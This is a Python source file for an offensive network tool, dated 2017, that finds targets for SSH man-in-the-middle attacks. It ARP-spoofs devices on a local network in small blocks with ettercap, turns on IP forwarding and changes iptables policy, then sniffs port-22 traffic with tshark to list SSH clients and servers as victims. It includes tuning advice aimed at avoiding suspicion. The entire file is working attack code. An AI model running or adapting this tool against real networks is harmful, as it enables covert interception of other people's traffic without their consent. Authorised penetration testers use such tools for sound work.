#!/usr/bin/python3
#
# JoesAwesomeSSHMITMVictimFinder.py
# Copyright (C) 2017  Joe Testa <jtesta@positronsecurity.com>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms version 3 of the GNU General Public License as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#
# Version: 1.0
# Date:    June 28, 2017
#
#
# This tool ARP spoofs the LAN in small chunks and looks for existing SSH
# connections.  This makes finding victims for SSH man-in-the-middling very
# easy (see https://github.com/jtesta/ssh-mitm).
#
# Install prerequisites with:
# apt install nmap ettercap-text-only tshark python3-netaddr python3-netifaces
#

# Built-in modules.
import argparse, importlib, ipaddress, os, signal, subprocess, sys, tempfile
from time import sleep

# Python3 is required.
if sys.version_info.major < 3:
    print('Error: Python3 is required.  Re-run using python3 interpreter.')
    exit(-1)

# Check if the netaddr and netifaces modules can be imported.  Otherwise, print
# a useful message to the user with how to install them.
old_netifaces = False
try:
    import netaddr, netifaces

    # Check if we're using an old version of netifaces (used in Ubuntu 14 and
    # Linux Mint 17).  If so, the user will need to specify the gateway
    # manually.
    if (netifaces.version.startswith('0.8')):
        old_netifaces = True
except ImportError as e:
    print("The Python3 netaddr and/or netifaces module is not installed.  Fix with:  apt install python3-netaddr python3-netifaces")
    exit(-1)


ettercap_proc = None
tshark_proc = None
forwarding_was_off = None

verbose = False
debug = False

# The overall findings, printed upon program termination.
total_local_clients = []
total_local_servers = []


# Debug logging.
def d(msg):
    if debug:
        print(msg, flush=True)


# Verbose logging.
def v(msg):
    if verbose:
        print(msg, flush=True)


# Always print.
def p(msg=''):
    print(msg, flush=True)


# Captures control-C interruptions and gracefully terminates tshark and
# ettercap.
def signal_handler(signum, frame):
    global ettercap_proc, tshark_proc, forwarding_was_off

    d('Signal handler called.')
    p("\nShutting down ettercap and tshark gracefully.  Please wait...")

    # tshark can just be terminated.
    if tshark_proc is not None:
        d('Sending tshark SIGTERM...')
        tshark_proc.terminate()

    # ettercap, however, needs to be shut down gracefully so it can re-ARP
    # victims.
    if ettercap_proc is not None:
        d('Telling ettercap to shut down gracefully...')
        try:
            ettercap_proc.communicate("q\n".encode('ascii'))
        except ValueError as e:
            # It is possible that the main thread already called communicate(),
            # to terminate the process, so calling it again causes an exception.
            # In this case, just wait for it to terminate.
            pass

    # Wait up to 20 seconds for tshark to terminate, then print its return code
    # to the debug log.
    if tshark_proc is not None:
        try:
            retcode = tshark_proc.wait(20)
            tshark_proc = None
            d('tshark terminated with return code %d' % retcode)
        except subprocess.TimeoutExpired as e:
            p('WARNING: tshark did not terminate after 20 seconds!  Sending SIGKILL...')
            pass

    # tshark survived more than 20 seconds after a SIGTERM, so now send it
    # SIGKILL and wait up to 10 more seconds.
    if tshark_proc is not None:
        try:
            tshark_proc.kill()
            retcode = tshark_proc.wait(10)
            tshark_proc = None
            d('After SIGKILL, tshark terminated with return code %d' % retcode)
        except subprocess.TimeoutExpired as e:
            p('ERROR: tshark did not terminate after 10 seconds, even with SIGKILL.  Try manually killing it (process ID %d).' % tshark_proc.pid)
            pass

    # Wait up to 20 seconds for ettercap to quit after telling it to.
    if ettercap_proc is not None:
        try:
            retcode = ettercap_proc.wait(20)
            ettercap_proc = None
            d('ettercap terminated with return code %d' % retcode)
        except subprocess.TimeoutExpired as e:
            pass

    # ettercap survived more than 20 seconds after a SIGTERM, so now send it
    # SIGKILL and wait up to 10 more seconds.
    if ettercap_proc is not None:
        d('WARNING: ettercap did not exit gracefully after requesting it to quit.  Now sending it SIGKILL...')
        ettercap_proc.kill()
        try:
            retcode = ettercap_proc.wait(10)
            ettercap_proc = None
            d('ettercap terminated with return code %d' % retcode)
        except subprocess.TimeoutExpired as e:
            p('ERROR: ettercap did not terminate after 10 seconds, even with SIGKILL.  Try manually killing it (process ID %d).' % ettercap_proc.pid)
            pass

    # If IP forwarding was off before this script was launched, disable it
    # before terminating.
    if forwarding_was_off is True:
        v('IP forwarding was off before.  Disabling it now...')
        enable_ip_forwarding(False)


    # Print all the IPs found.
    p()
    if len(total_local_clients) > 0:
        p("\nTotal local clients:")
        for tup in total_local_clients:
            p('  * %s -> %s:22' % (tup[0], tup[1]))
        p()
    else:
        p('No local clients found.  :(')

    if len(total_local_servers) > 0:
        p("\nTotal local servers:")
        for tup in total_local_servers:
            p('  * %s -> %s:22' % (tup[1], tup[0]))
        p()

    exit(0)


# Ensure that nmap, ettercap, and tshark are all installed, and we are running
# as root.  Terminates otherwise.
def check_prereqs():
    missing_progs = []
    if not find_prog(['nmap', '-V']):
        missing_progs.append('nmap')

    if not find_prog(['ettercap', '-v']):
        missing_progs.append('ettercap-text-only')

    if not find_prog(['tshark', '-v']):
        missing_progs.append('tshark')

    if len(missing_progs) > 0:
        missing_progs_str = ' '.join(missing_progs)
        p("Error: the following pre-requisite programs are missing: %s\n\nInstall them with:  apt install %s" % (missing_progs_str, missing_progs_str))
        exit(-1)

    # We must be running as root for ettercap to work.
    if os.geteuid() != 0:
        p("Error: you must run this script as root.")
        exit(-1)

    # Check if there are existing PREROUTING NAT rules enabled, and warn the
    # user of potential side-effects.
    try:
        hProc = subprocess.Popen(['iptables', '-t', 'nat', '-nL', 'PREROUTING'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        so, se = hProc.communicate()
        prerouting_output = so.decode('ascii')

        # Output with no rules has two lines.
        if prerouting_output.count("\n") > 2:
            p("\nWARNING: it appears that you have entries in your PREROUTING NAT table.  Searching for SSH connections on the LAN with this script while PREROUTING rules are enabled may have unintended side-effects.  The output of 'iptables -t nat -nL PREROUTING' is:\n\n%s\n\n" % prerouting_output)
    except FileNotFoundError as e:
        p('Warning: failed to run iptables.  Continuing...')
        pass


# Returns True if a program is installed on the system, otherwise False.
def find_prog(prog_args):
    prog_found = False
    try:
        hProc = subprocess.Popen(prog_args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        s, e = hProc.communicate()
        prog_found = True
    except FileNotFoundError as e:
        pass

    return prog_found


# Returns True if IP forwarding is enabled, otherwise False.
def get_ip_forward_settings():
    ipv4_setting = None

    with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
        ipv4_setting = f.read().strip()

    return ipv4_setting.strip() == '1'


# Enables or disables IP forwarding.  If it was disabled prior to calling this
# function, returns True (helpful for knowing if it needs to be turned back off
# later).
def enable_ip_forwarding(flag):
    old_ipv4_setting = get_ip_forward_settings()

    if flag and not old_ipv4_setting:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')

    if not flag and old_ipv4_setting:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0')

    # Enable or disable forwarding in the firewall, as appropriate.
    if flag:
        subprocess.call("iptables -P FORWARD ACCEPT", shell=True)
    else:
        subprocess.call("iptables -P FORWARD DROP", shell=True)

    current_ipv4_setting = get_ip_forward_settings()
    if current_ipv4_setting != flag:
        raise RuntimeError('Failed to set IP forwarding setting!: %r %r' % (current_ipv4_setting, flag))

    return old_ipv4_setting == False


# Runs nmap to get the devices on the LAN that are alive (using ARP pings).
def get_lan_devices(network, gateway, ignore_list):
    ret = []
    fd, temp = tempfile.mkstemp()
    os.close(fd)

    hNmap = subprocess.Popen(['nmap', '-n', '-oG=%s' % temp, '-sn', '-PR', network], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    try:
        hNmap.wait(30)
    except subprocess.TimeoutExpired as e:
        p('Nmap ARP ping took longer than 30 seconds.  Terminating...')
        exit(-1)

    nmap_output = ''
    with open(temp, 'r') as f:
        nmap_output = f.readlines()

    # Delete nmap's output file.
    if os.path.exists(temp):
        os.remove(temp)

    for line in nmap_output:
        tokens = line.split()
        if tokens[0] == 'Host:':
           ret.append(tokens[1])

    # Remove the gateway from the list of live devices.
    if gateway in ret:
        ret.remove(gateway)

    # Remove the entries of the ignore_list from the list of live devices.
    for ip in ignore_list:
        if ip in ret:
            ret.remove(ip)

    return ret


# Splits a list of devices into blocks of size "block_size".
def blocketize_devices(devices, block_size):
    device_blocks = []
    device_block = []
    i = 0
    for device in devices:
        device_block.append(device)
        i += 1

        if (i >= block_size) or (devices.index(device) == (len(devices) - 1)) :
            i = 0
            device_blocks.append(device_block)
            device_block = []

    return device_blocks


def arp_spoof_and_monitor(interface, local_addresses, gateway, device_block, listen_time):
    global ettercap_proc, tshark_proc

    # Run tshark with an SSH filter.
    tshark_args = ['tshark', '-i', interface, '-T', 'fields', '-e', 'ip.src', '-e', 'ip.dst', '-e', 'tcp.port']

    # Exclude packets to or from the local machine.
    if len(local_addresses) > 0:
        tshark_args.extend(['-f', 'port 22 and not(host %s)' % ' or host '.join(local_addresses)])
    else:
        tshark_args.extend(['-f', 'port 22'])

    d('Running tshark: %s' % ' '.join(tshark_args))
    tshark_proc = subprocess.Popen(tshark_args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    # ARP spoof the block of devices and gateway.
    ettercap_args = ['ettercap', '-i', interface, '-T', '-M', 'arp', '/%s//' % gateway, '/%s//' % ','.join(device_block)]
    d('Running ettercap: %s' % ' '.join(ettercap_args))
    ettercap_proc = subprocess.Popen(ettercap_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    # Sleep for the specified number of seconds while tshark gathers info.
    d('Sleeping for %d seconds...' % listen_time)
    sleep(listen_time)

    # Stop tshark.
    tshark_proc.terminate()

    # Send 'q' and a newline to tell ettercap to quit gracefully.
    so, se = ettercap_proc.communicate("q\n".encode('ascii'))

    # Get the output from the terminated tshark process.
    so, se = tshark_proc.communicate()
    lines = so.decode('ascii').split("\n")

    local_clients = []
    local_servers = []

    # Each line is in the following format:
    # 10.x.x.x\t174.x.x.x\t38564,22
    for line in lines:
       if line == '':
           continue

       fields = line.split("\t")
       ip1 = fields[0]
       ip2 = fields[1]

       ports = fields[2].split(',')
       port1 = ports[0]
       port2 = ports[1]

       local_client = None
       local_server = None
       remote_client = None
       remote_server = None
       if (ip1 in device_block) and (port2 == '22'):
           local_client = ip1
           remote_server = ip2
       elif (ip2 in device_block) and (port1 == '22'):
           local_client = ip2
           remote_server = ip1
       elif (ip1 in device_block) and (port1 == '22'):
           local_server = ip1
           remote_client = ip2
       elif (ip2 in device_block) and (port2 == '22'):
           local_server = ip2
           remote_client = ip1
       else:
           p('Strange tshark output found: [%s]' % line)
           p("\tdevice block: [%s]" % ",".join(device_block))
           continue

       # Look for outgoing connections.
       if (local_client is not None) and (remote_server is not None):
           tup = (local_client, remote_server)
           if tup not in local_clients:
               local_clients.append(tup)
       # Look for incoming connections (implying a server is running on the
       # LAN).
       elif (local_server is not None) and (remote_client is not None):
           tup = (local_server, remote_client)
           if tup not in local_servers:
               local_servers.append(tup)

    if len(local_clients) == 0 and len(local_servers) == 0:
       v('No SSH connections found.')

    if len(local_clients) > 0:
       p("\nLocal clients:")
       for tup in local_clients:
           p('  * %s -> %s:22' % (tup[0], tup[1]))
       p()
       total_local_clients.extend(x for x in local_clients if x not in total_local_clients)

    if len(local_servers) > 0:
       p("\nLocal servers:")
       for tup in local_servers:
           p('  * %s -> %s:22' % (tup[1], tup[0]))
       p()
       total_local_servers.extend(x for x in local_servers if x not in total_local_servers)


if __name__ == '__main__':
    check_prereqs()

    parser = argparse.ArgumentParser()
    required = parser.add_argument_group('required arguments')
    required.add_argument('--interface', help='the network interface to listen on', required=True)
    parser.add_argument('--block-size', help='the number of IPs to ARP spoof at a time (default: 5)', default=5)
    parser.add_argument('--listen-time', help='the number of seconds to listen for SSH activity (default: 20)', default=20)
    parser.add_argument('--ignore-ips', help='the IPs to ignore.  Can be space or comma-delimited', nargs='+', default=[])
    parser.add_argument('--one-pass', help='perform one pass of the network only, instead of looping', action='store_true')
    parser.add_argument('-v', '--verbose', help='enable verbose messages', action='store_true')
    parser.add_argument('-d', '--debug', help='enable debugging messages', action='store_true')

    # If we loaded an old netifaces module, the user must specify the gateway
    # manually.
    if old_netifaces:
        required.add_argument('--gateway', help='the network gateway', required=True)

    args = vars(parser.parse_args())


    # The network interface to use.
    interface = args['interface']

    # A list of IPs to ignore.
    ignore_list = args['ignore_ips']

    # If the user specified the ignore list as "--ignore-ips 1.1.1.1,2.2.2.2",
    # parse them out into a list.
    if len(ignore_list) == 1:
        ips = ignore_list[0]
        if ips.find(',') != -1:
            ignore_list = ips.split(',')

    # Ensure IPs are in a valid form.
    for ip in ignore_list:
        try:
            ipaddress.ip_address(ip)
        except ValueError as e:
            p('Error: %s is not a valid IP address.' % ip)
            exit(-1)

    # Parse the interface arg.
    addresses = None
    try:
        addresses = netifaces.ifaddresses(interface)
    except ValueError as e:
        p('Error parsing interface: %s' % str(e))
        exit(-1)

    # Add our address(es) to the ignore list.
    local_addresses = []
    if netifaces.AF_INET in addresses:
        for net_info in addresses[netifaces.AF_INET]:
            address = net_info['addr']
            p("Found local address %s and adding to ignore list." % address)
            local_addresses.append(address)
            ignore_list.append(address)

    if len(local_addresses) == 0:
        p("Error: failed to get the IP address for interface %s" % interface)
        exit(-1)

    # Get the CIDR format of our network.
    net_info = addresses[netifaces.AF_INET][0]
    net_cidr = str(netaddr.IPNetwork('%s/%s' % (net_info['addr'], net_info['netmask'])))
    p("Using network CIDR %s." % net_cidr)

    # Get the default gateway.
    if old_netifaces:
        gateway = args['gateway']
    else:
        gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
    p("Found default gateway: %s" % gateway)

    # The number of IPs in the LAN to ARP spoof at a time.  This should be a
    # relatively low number, as spoofing too many clients at a time can cause
    # noticeable slowdowns.
    block_size = int(args['block_size'])

    # The number of seconds to sniff a MITMed block of clients before moving on
    # to the next block.
    listen_time = int(args['listen_time'])

    # If True, only one pass is done over the clients in the network.
    # Otherwise, it will loop indefinitely.
    one_pass = args['one_pass']

    # Flags to control verbose and debug outputs.
    verbose = args['verbose']
    debug = args['debug']

    p('IP blocks of size %d will be spoofed for %d seconds each.' % (block_size, listen_time))
    if len(ignore_list) > 0:
        p('The following IPs will be skipped: %s' % ' '.join(ignore_list))
    if one_pass:
        p('The network will be scanned in only one pass.')
    p("\n")

    # If the user raised the block size to 10 or greater, warn them about the
    # potential consequences.
    if block_size >= 10:
        p("WARNING: setting the block size too high will cause strain on your network interface.  Eventually, your interface will start dropping frames, causing a network denial-of-service and greatly raising suspicion.  However, raising the block size is safe on low-utilization networks.  You better know what you're doing!\n")

    # Enable the signal handlers so that ettercap and tshark gracefully shut
    # down on CTRL-C.
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    forwarding_was_off = enable_ip_forwarding(True)
    while True:

        v('Discovering devices on LAN via ARP ping...')
        devices = get_lan_devices(net_cidr, gateway, ignore_list)
        d('%d devices discovered: %s' % (len(devices), ", ".join(devices)))

        # Arrange the devices into groups of size "block_size".
        device_blocks = blocketize_devices(devices, block_size)

        # ARP spoof and monitor each block.
        for device_block in device_blocks:
            arp_spoof_and_monitor(interface, local_addresses, gateway, device_block, listen_time)

        # If we are only supposed to do one pass, then stop now.
        if one_pass:
            break

    # If IP forwarding was off before we started, turn it off now.
    if forwarding_was_off:
        enable_ip_forwarding(False)

    p('Single pass complete.')
    exit(0)
